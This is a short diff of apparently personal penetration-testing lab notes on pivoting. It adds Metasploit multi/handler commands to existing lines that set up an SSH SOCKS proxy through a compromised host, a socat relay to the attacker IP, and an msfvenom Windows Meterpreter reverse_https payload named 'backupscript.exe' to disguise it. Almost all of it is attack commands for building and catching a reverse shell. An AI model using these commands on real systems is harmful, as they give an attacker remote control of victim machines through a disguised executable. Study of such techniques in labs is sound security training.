@@ -124,6 +124,9 @@ ssh -D 9050 alreadyCompromisedMachine@10.129.202.64
    Attacker IP: 10.10.14.18
    victim@compromisedhost:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
    attacker/machine$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+   msf6 > use exploit/multi/handler
+   msf6 exploit(multi/handler) > set lport 80
+   msf6 exploit(multi/handler) > run
    Running the backupscript.exe on victim machine would connect to the attacker machine
    ```
    
